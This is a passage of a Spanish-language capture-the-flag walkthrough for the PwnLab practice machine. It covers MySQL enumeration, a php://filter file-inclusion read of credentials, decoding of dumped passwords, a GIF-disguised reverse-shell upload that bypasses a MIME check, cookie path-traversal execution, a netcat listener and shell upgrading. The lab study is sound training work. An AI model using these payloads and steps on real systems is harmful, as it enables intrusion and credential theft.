**Nota**: si en algún escaneo se detecta un servicio **nfs** probablemente se pueda enumerar, cargar y/o descargar archivos, para más información [Servicio nfs](https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting).

Más información acerca del puerto 111

- [book.hacktricks.xyz](https://book.hacktricks.xyz/network-services-pentesting/pentesting-rpcbind)
- [howtouselinux.com](https://www.howtouselinux.com/post/understanding-rpcbind-and-rpc)
- [qastack.mx](https://qastack.mx/unix/234154/exactly-what-does-rpcbind-do)

Como no se encontró infomación valiosa en este lugar, seguimos con el siguiente puerto **3306**:

```
PORT     STATE SERVICE REASON         VERSION
3306/tcp open  mysql   syn-ack ttl 64 MySQL 5.5.47-0+deb8u1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.47-0+deb8u1
|   Thread ID: 39
|   Capabilities flags: 63487
|   Some Capabilities: Support41Auth, SupportsTransactions, Speaks41ProtocolNew, Speaks41ProtocolOld, FoundRows, InteractiveClient, SupportsLoadDataLocal, SupportsCompression, ConnectWithDatabase, IgnoreSigpipes, LongColumnFlag, IgnoreSpaceBeforeParenthesis, LongPassword, ODBCClient, DontAllowDatabaseTableColumn, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
|   Status: Autocommit
|   Salt: _H'+BI(-IeD`99QlLv1-
|_  Auth Plugin Name: mysql_native_password
```

Lo ideal al realizar un escaneo de cualquier host es buscar las vulnerabilidades conocidas acerca del servicio que esté corriendo en el puerto localizado, en este caso buscamos las vulnerabilidades de MySQL 5.5.47 y encontramos bastantes vulnerabilidades conocidas:

- [security.snyk.io](https://security.snyk.io/package/linux/debian:8/mysql-5.5)
- [cvedetails.com](https://www.cvedetails.com/vulnerability-list.php?vendor_id=185&product_id=316&version_id=0&page=1&hasexp=0&opdos=0&opec=0&opov=0&opcsrf=0&opgpriv=0&opsqli=0&opxss=0&opdirt=0&opmemc=0&ophttprs=0&opbyp=0&opfileinc=0&opginf=0&cvssscoremin=0&cvssscoremax=0&year=0&cweid=0&order=1&trc=205&sha=db4d7f9ce3bd6b34321f8d0190d4c1dc2fe6e3a8)
- [securecoding.com](https://www.securecoding.com/blog/top-5-mysql-vulnerabilities-and-how-to-fix-them/) 

Aquí se utilizará la información que obtuvimos en la última consulta del puerto 80 a la página **config.php**:

```
┌──(al3j4ndr0㉿kali)-[~]
└─$ curl -s http://174.0.0.129?page=php://filter/convert.base64-encode/resource=config | grep -e '[^\ ]\{40,\}' | base64 -d
<?php
$server   = "localhost";
$username = "root";
$password = "H4u%QJ_H99";
$database = "Users";
?>base64: entrada inválida
```

Vamos a conectarnos a la base de datos con las credenciales que anteriormente nos aparecieron:

```
┌──(al3j4ndr0㉿kali)-[~]
└─$ mysql -u root -p -h 174.0.0.129
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 55
Server version: 5.5.47-0+deb8u1 (Debian)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> 
```

Como vemos, ya tenemos acceso a la base de datos, ahora revisemos las bases de datos cargadas:

```
MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| Users              |
+--------------------+
2 rows in set (0.006 sec)
```

Ahora revisaremos que información tiene la base de datos **Users**:

```
MySQL [(none)]> use Users;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [Users]> show tables;
+-----------------+
| Tables_in_Users |
+-----------------+
| users           |
+-----------------+
1 row in set (0.018 sec)

MySQL [Users]> select * from users;
+------+------------------+
| user | pass             |
+------+------------------+
| kent | Sld6WHVCSkpOeQ== |
| mike | U0lmZHNURW42SQ== |
| kane | aVN2NVltMkdSbw== |
+------+------------------+
3 rows in set (0.008 sec)
```

Después de esto nos salimos de la base de datos con el comando *exit*. Ya tenemos 3 usuarios y sus contraseñas; las contraseñas están codificadas, si copiamos la primer contraseña y la pegamos en el navegador veremos que está codificada en *base 64*:

<center>
    <img src='./../assets/img/posts/20230702/Session_12.png'>
</center>

Así que ingresamos a ese sitio y decodificamos cada una de las contraseñas por separado, obteniendo lo siguiente:

```
+------+------------------+
| user | pass             |
+------+------------------+
| kent | JWzXuBJJNy       |
| mike | SIfdsTEn6I       |
| kane | iSv5Ym2GRo       |
+------+------------------+
```

Obteniendo las contraseñas legibles, volvemos a la página inicial e intentamos ingresar con las contraseñas obtenidas:

<center>
    <img src='./../assets/img/posts/20230702/Session_13.png'>
    <img src='./../assets/img/posts/20230702/Session_14.png'>
</center>

Utilizando la primer contraseña pudimos ingresar sin complicaciones, y nos dirige a la página de upload; estando aquí lo que podemos hacer es cargar una imagen con un código de una shell incrustado para crear una backdoor; en este ejercicio utilizaré un código de [reverse shell](https://github.com/4rleking/Shell_reverse_php/blob/main/C%C3%B3digo) el cuál está en mi repositorio.

Al momento de copiar este código en un nuevo archivo, este se llamará *Shell_reverse.gif* y se cargará a la plataforma del servidor.

Al momento de enviarse nos indica un error **Error 002**, si volvemos al código que descargamos de la página *upload*, encontramos que necesita cumplirse ciertas condiciones (mime) para poder cargar un archivo al servidor:

```
if($imageinfo['mime'] != 'image/gif' && $imageinfo['mime'] != 'image/jpeg' && $imageinfo['mime'] != 'image/jpg'&& $imageinfo['mime'] != 'image/png') {
    die('Error 002');
    }
```

Esto realiza un pequeño analisis al código, volvemos a nuestro archivo *Shell_reverse.gif* y lo modificamos con el comando **nano** y agregamos la palabra **GIF** al inicio del código, guardamos y volvemos a cargar el archivo al servidor.

<center>
    <img src='./../assets/img/posts/20230702/Session_15.png'>
</center>

Si nos dirigimos a la página *home* no encontraremos ningún archivo; pero si nos dirigimos a la página:

```
http://174.0.0.129/upload/
```

<center>
    <img src='./../assets/img/posts/20230702/Session_16.png'>
</center>

Encontraremos el archivo cargado exitosamente.

Ahora que ya tenemos el archivo cargado, utilizaremos la herramienta **BurpSuite**; con esta herramienta lo que haremos será ejecutar nuestro código para poder crear una *shell*.

Una vez abierta la herramienta, debemos de irnos a la parte del proxy, abrimos el navegador, nos dirigimos a la página **174.0.0.129/**, iniciamos sesión, verificamos que el archivo siga cargado en *174.0.0.129/upload*, y por último hablilitamos la opción **intercept is on** para interceptar toda solicitud enviada y recibida al servidor victima.

<center>
    <img src='./../assets/img/posts/20230702/Session_17.png'>
</center>

Anteriormente en la parte del código php que obtuvimos en la página index, apareció una *cookie* llamada lang; esta cookie esta concatenando con su constante, de ahí nos vamos a poder aprovechar para correr nuestro código.

```
┌──(al3j4ndr0㉿kali)-[~]
└─$ curl -s http://174.0.0.129?page=php://filter/convert.base64-encode/resource=index | grep -e '[^\ ]\{40,\}' | base64 -d
<?php
//Multilingual. Not implemented yet.
//setcookie("lang","en.lang.php");
if (isset($_COOKIE['lang']))
{
        include("lang/".$_COOKIE['lang']);
}
// Not implemented yet.
?>
```

Para poder correr el código, primero nos dirigimos a la página */login* (aunque ya estemos logueados) estp cpn la finalidad de que nos arroje la cookie. Al momento de enviar la solicitud, nos aparecerá lo siguiente:

<center>
    <img src='./../assets/img/posts/20230702/Session_18.png'>
</center>

Aún no cambiamos nada, solo seleccionamos la opción **forward**, ahora nos dirigimos a la sección *HTTP history* y buscamos la solicitud que acabamos de enviar.

<center>
    <img src='./../assets/img/posts/20230702/Session_19.png'>
</center>

Estando aquí la seleccionamos con el segundo botón del mouse, y seleccionamos la opción *Send to Repeater*, nos aparecerá el titulo de la sección de color naranja y nos dirigimos ahí.

<center>
    <img src='./../assets/img/posts/20230702/Session_20.png'>
</center>

Después lo que haremos será selecciona la parte de la cookie y borrarla, cambiaremos ese valor por:

```
lang=../upload/c6071bea32b2540949636f8bafc75842.gif
```

<center>
    <img src='./../assets/img/posts/20230702/Session_21.png'>
    <img src='./../assets/img/posts/20230702/Session_22.png'>
</center>

una vez realizado esto, damos click en la opción **send** y nos aparecerá la siguiente respuesta.

<center>
    <img src='./../assets/img/posts/20230702/Session_23.png'>
</center>

**Ojo:** en la cabecera de la respuesta debe de aparecer *HTTP/1.1 200 OK*; si aparece otro código que no sea 200, revisa algún paso que salió algo mal.

Cuando obtenemos esta respuesta, es porque nuestro código se ejecutó sin problema, ahora lo que sigue es utilizar la herramienta **netcat** o podemos utilizar **metasploit**, cualquiera de las 2 es viable, más completa es metasploit pero en este caso solo se utilizará para abrir el puerto 4000 a la escucha, así que utilizaré netcat.

```
nc -l -p 4000
```

<center>
    <img src='./../assets/img/posts/20230702/Session_24.png'>
</center>

aún no tenemos ninguna respuesta, volvemos a Burpsuite y volvemos a ejecutar nuestro código, sin modificar nada de como lo dejamos y sólo volvemos a enviar la solicitud:

<center>
    <img src='./../assets/img/posts/20230702/Session_25.png'>
</center>

Como vemos no recibimos ninguna respuesta, pero vamos con netcat:

<center>
    <img src='./../assets/img/posts/20230702/Session_26.png'>
</center>

Ya obtuvimos acceso al sistema, ahora nos toca escalar privilegios; para ello utilizamos 2 comandos:

```
bash -i
```
```
python -c "import pty;pty.spawn('/bin/bash')"
```

<center>
    <img src='./../assets/img/posts/20230702/Session_27.png'>
</center>

Una vez elevados los privilegios accedemos al usuario *kent* y revisamos lo que tiene este usuario.

<center>
    <img src='./../assets/img/posts/20230702/Session_28.png'>
</center>

Desafortunadamente no contiene nignuna información, ahora buscaremos con los demás usuarios a ver que información encontramos.

Al utilizar el usuario **kane** revisando el directorio *home* hay un archivo llamado *msgmike*

<center>
    <img src='./../assets/img/posts/20230702/Session_29.png'>
</center>

Intentamos leerlo, pero es ilegible, así que buscamos información de este archivo.

```
kane@pwnlab:~$ file msgmike
file msgmike
msgmike: setuid, setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=d7e0b21f33b2134bd17467c3bb9be37deb88b365, not stripped
```

Resulta ser un ejectutable, pero al momento de correrlo nos damos cuenta de que no podemos porque tiene el *bit suid* establecido por el usuario **mike**

```
kane@pwnlab:~$ ./msgmike
./msgmike
cat: /home/mike/msg.txt: No such file or directory
kane@pwnlab:~$ ls -la msgmike
ls -la msgmike
-rwsr-sr-x 1 mike mike 5148 Mar 17  2016 msgmike
```